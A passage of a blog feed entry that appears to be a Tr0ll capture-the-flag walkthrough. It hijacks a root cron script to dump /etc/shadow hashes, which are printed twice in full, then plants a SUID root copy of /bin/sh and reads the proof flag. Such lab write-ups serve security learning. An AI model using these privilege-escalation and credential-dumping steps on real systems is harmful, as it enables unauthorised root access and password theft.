-</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/hashes.txt&#39;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">hashes</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">hashes</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">juicy</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now we have the password hashes and we could crack them if we wanted:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /tmp/hashes.txt
-</span><span class='line'>root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
-</span><span class='line'>daemon:*:16273:0:99999:7:::
-</span><span class='line'>bin:*:16273:0:99999:7:::
-</span><span class='line'>sys:*:16273:0:99999:7:::
-</span><span class='line'>sync:*:16273:0:99999:7:::
-</span><span class='line'>games:*:16273:0:99999:7:::
-</span><span class='line'>man:*:16273:0:99999:7:::
-</span><span class='line'>lp:*:16273:0:99999:7:::
-</span><span class='line'>mail:*:16273:0:99999:7:::
-</span><span class='line'>news:*:16273:0:99999:7:::
-</span><span class='line'>uucp:*:16273:0:99999:7:::
-</span><span class='line'>proxy:*:16273:0:99999:7:::
-</span><span class='line'>www-data:*:16273:0:99999:7:::
-</span><span class='line'>backup:*:16273:0:99999:7:::
-</span><span class='line'>list:*:16273:0:99999:7:::
-</span><span class='line'>irc:*:16273:0:99999:7:::
-</span><span class='line'>gnats:*:16273:0:99999:7:::
-</span><span class='line'>nobody:*:16273:0:99999:7:::
-</span><span class='line'>libuuid:!:16273:0:99999:7:::
-</span><span class='line'>syslog:*:16273:0:99999:7:::
-</span><span class='line'>messagebus:*:16291:0:99999:7:::
-</span><span class='line'>troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
-</span><span class='line'>sshd:*:16291:0:99999:7:::
-</span><span class='line'>ftp:*:16292:0:99999:7:::
-</span><span class='line'>lololol:!:16292:0:99999:7:::
-</span><span class='line'>overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
-</span><span class='line'>ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
-</span><span class='line'>maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
-</span><span class='line'>felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
-</span><span class='line'>Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
-</span><span class='line'>genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
-</span><span class='line'>usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
-</span><span class='line'>blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
-</span><span class='line'>wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
-</span><span class='line'>vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::
-</span><span class='line'>root:$6$mdQyunCS$qRhQug5j4xuM2vwsSlFJ0TrAVmfCV5h0VgKjbBp5BN2hL6ySxGL8Tt.qa2GlVotm7DFK7OUG9naqK6Kdf1aEZ.:16292:0:99999:7:::
-</span><span class='line'>daemon:*:16273:0:99999:7:::
-</span><span class='line'>bin:*:16273:0:99999:7:::
-</span><span class='line'>sys:*:16273:0:99999:7:::
-</span><span class='line'>sync:*:16273:0:99999:7:::
-</span><span class='line'>games:*:16273:0:99999:7:::
-</span><span class='line'>man:*:16273:0:99999:7:::
-</span><span class='line'>lp:*:16273:0:99999:7:::
-</span><span class='line'>mail:*:16273:0:99999:7:::
-</span><span class='line'>news:*:16273:0:99999:7:::
-</span><span class='line'>uucp:*:16273:0:99999:7:::
-</span><span class='line'>proxy:*:16273:0:99999:7:::
-</span><span class='line'>www-data:*:16273:0:99999:7:::
-</span><span class='line'>backup:*:16273:0:99999:7:::
-</span><span class='line'>list:*:16273:0:99999:7:::
-</span><span class='line'>irc:*:16273:0:99999:7:::
-</span><span class='line'>gnats:*:16273:0:99999:7:::
-</span><span class='line'>nobody:*:16273:0:99999:7:::
-</span><span class='line'>libuuid:!:16273:0:99999:7:::
-</span><span class='line'>syslog:*:16273:0:99999:7:::
-</span><span class='line'>messagebus:*:16291:0:99999:7:::
-</span><span class='line'>troll:$6$9WnrXzBm$ijsblc.QCK1kTlHCxiH5Dt3eUhZgEVaIpkIifyIx6EmPpD03xmIyPD6l/dVlUAE0Q4jGqaiusEkvb3BEDNcs6.:16292:0:99999:7:::
-</span><span class='line'>sshd:*:16291:0:99999:7:::
-</span><span class='line'>ftp:*:16292:0:99999:7:::
-</span><span class='line'>lololol:!:16292:0:99999:7:::
-</span><span class='line'>overflow:$6$RSQQWzPh$JB3Jm3liSEjq.ytLU2Hr.N6bTUEgkVtW5KSkCzVzvLf7zBT4eHuc0EUeEUPw3v5epKsZ9mLFfurV6gSUtpcZa.:16292:0:99999:7:::
-</span><span class='line'>ps-aux:$6$N8fO8B2w$ABHj.O2jTfIizBfrb0SpgN6VJLDujJ6o9wR4D0b4ZqqlfKQzW1M0xG0uTR4AZW77BFH0rsA2ZxnoGSMdwy3k00:16292:0:99999:7:::
-</span><span class='line'>maleus:$6$Y.Ev9AQx$IS.ikFcKj5.natBbOMMP3GiV9LJDjCQaHuvKoEeA1hPjhss8qLzjVPpuSnKysIF261sSnjOfoFjhpo.rO8qDg.:16292:0:99999:7:::
-</span><span class='line'>felux:$6$t0WWHdf0$9QYd6dc9XuZo.RwMRCdrzuTPTqaCJ47KAS7p1EitR2LVGJsOqjarTxD67WUhLQvmF3KOFIfgvN3rlw7cfU132.:16292:0:99999:7:::
-</span><span class='line'>Eagle11:$6$Pz9WUVEk$PPQQs334rlXCZRRY1w/uullgDaKeIMGNlzUXERsCl7zIrdulDtrcYD74t/mtw0yhqsJJQFXrZ08dpk0gEx0gX1:16292:0:99999:7:::
-</span><span class='line'>genphlux:$6$K2gip8vY$jcbwnoeCKqtu.9IkVbBNDJ3TAV0NcVSWgv2U3uYx1e942dcaD1NhxEpBklKAX1NnnrDCw6SU1Fw7vJ6tmOiCM/:16292:0:99999:7:::
-</span><span class='line'>usmc8892:$6$MlFBCUvT$YS7ZpyXavI6tGgYJW3fPFRbUlV2yhoHGir26minsRRBTTDf60NIwxi7PP3S8/vePYFBVVuSC0kfyBYeMnHnBO1:16292:0:99999:7:::
-</span><span class='line'>blawrg:$6$Pg7SOYWy$Ap9wmycvq0n2iR8CJNKcY/SBUrOqC4Dc8D6whHDnZNp8xqLCB/GF2Et4lHnhHehWkgObxSX5MZWofAc4QQSbj1:16292:0:99999:7:::
-</span><span class='line'>wytshadow:$6$Xw3TqkwY$O2Xx5JXO9DXSyqumRCBWa2fk0Z0glVUNty9nKkms4SlAKMtWwmHvNRHiIClPa4SGvCii0fCi5Xxg6gvoZrXhG0:16292:0:99999:7:::
-</span><span class='line'>vis1t0r:$6$nVShrZJb$ZAZ9nf4vzddUm1ISPO8gKgYweQopjc/Ta7jbEacYbDVOG1g8Y3LHwiJhU2NsDJljkn2Oc4xPJPeMpox5jSBHd0:16292:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-
-<p>But I am not a fan of cracking passwords, if it can be avoided. And in this case, we still have the other Python file to check. So I modified the cleaner code again:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/opt/lmao.py&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">lmao</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">lol</span> <span class="o">=</span> <span class="n">lmao</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/lol.py&#39;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">rofl</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">rofl</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">lol</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And after a little bit of waiting, we finally have the culprit that is killing our shells:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /tmp/lol.py
-</span><span class='line'>#!/usr/bin/env python
-</span><span class='line'>import os
-</span><span class='line'>
-</span><span class='line'>os.system('echo "TIMES UP LOL!"|wall')
-</span><span class='line'>os.system("pkill -u 'overflow'")
-</span><span class='line'>sys.exit()</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Ok, now let&rsquo;s finish by getting a shell. We can leverage the cleaner file to copy the shell executable and give it outrageously lax permissions and SUID bit. Note that I&rsquo;m not saying bash, because the shell being used here is the <em>sh</em> shell.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo $SHELL
-</span><span class='line'>/bin/sh</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Here is the simple code for copying the shell file to <em>/tmp/</em> and letting everyone run it with root permissions:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span>
-</span><span class='line'>
-</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;cp /bin/sh /tmp/trolled&#39;</span><span class="p">)</span>
-</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&#39;chmod 4777 /tmp/trolled&#39;</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now just wait for cron. Check the loot and pwn the troll!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -l /tmp/trolled
-</span><span class='line'>-rwsrwxrwx 1 root root 112204 Feb  3 04:50 /tmp/trolled
-</span><span class='line'>$ /tmp/trolled
-</span><span class='line'># whoami
-</span><span class='line'>root
-</span><span class='line'># ls /root/
-</span><span class='line'>proof.txt
-</span><span class='line'># cat /root/proof.txt
-</span><span class='line'>Good job, you did it! 
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>702a8c18d29c6f3ca0d99ef5712bfbdc</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Alternatively, since the original objective was only to read the proof file, you can just use the cleaner file to do it, providing you know the name of the proof file:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/root/proof.txt&#39;</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">proof</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">win</span> <span class="o">=</span> <span class="n">proof</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/proof.txt&#39;</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">pwned</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">pwned</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">win</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And here it is:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /tmp/proof.txt
-</span><span class='line'>Good job, you did it! 
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>702a8c18d29c6f3ca0d99ef5712bfbdc</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Fortune cookie:</p>
-
-<blockquote><p>He that breaks a thing to find out what it is has left the path of wisdom.
-  &mdash; J.R.R. Tolkien</p></blockquote>
-
-<p><strong>Random rant</strong></p>
-
-<p>I started this post in 2014 and completed it in 2015! Who&rsquo;s the troll now?</p>
-
-<p>Been busy and inactive for a couple of months, but I am back now and hopefully without such long pauses between posts.</p>
 ]]></content>
   </entry>
   
